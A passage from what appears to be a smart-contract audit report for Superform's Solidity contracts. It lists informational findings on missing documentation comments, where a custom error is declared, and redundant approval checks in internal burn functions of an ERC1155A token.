[14](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L14)

```solidity
File: superform-core/src/settings/SuperRegistry.sol

/// @audit missed @notice
12: contract SuperRegistry is ISuperRegistry, QuorumManager {

```

[12](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L12)



### Error definition should be on `aERC20` interface

**Severity:** Informational

**Context:** [aERC20.sol#L14-L14](ERC1155A/src/aERC20.sol#L14-L14)

**Description**: The aERC20 contract, an extension of ERC20, introduces a custom error `ONLY_ERC1155A`. Currently, this error is defined within the aERC20 contract itself. However, for enhanced clarity and adherence to Solidity best practices, it's recommended that this error be declared in the `IaERC20` interface. 


**Recommendation**: Relocate the `ONLY_ERC1155A` error declaration from the aERC20 contract to the `IaERC20` interface. This modification should not introduce new issues, provided that all references to the error in the aERC20 contract are updated accordingly. 



### Unnecessary approval checks in Internal `_burn` and `_batchBurn` functions

**Severity:** Informational

**Context:** [ERC1155A.sol#L487-L489](ERC1155A/src/ERC1155A.sol#L487-L489), [ERC1155A.sol#L515-L519](ERC1155A/src/ERC1155A.sol#L515-L519)

**Description**: The ERC1155A contract, designed as an implementation of the ERC1155 standard. Implements two internal functions: `_burn` and `_batchBurn`. 
The `_burn` and `_batchBurn` functions include checks for `allowance` of the operator for the tokens being burned. This is unnecessary for internal functions intended to be used by the contract itself, as the contract should inherently have control over its tokens.


**Recommendation**: To resolve this issue, it is recommended to remove the approval checks from the `_burn` and `_batchBurn` functions.  After removing the checks, inheriting contracts will have the expected control over burning their tokens without unnecessary restraints. 
And remember to add approval checks on the open functions.




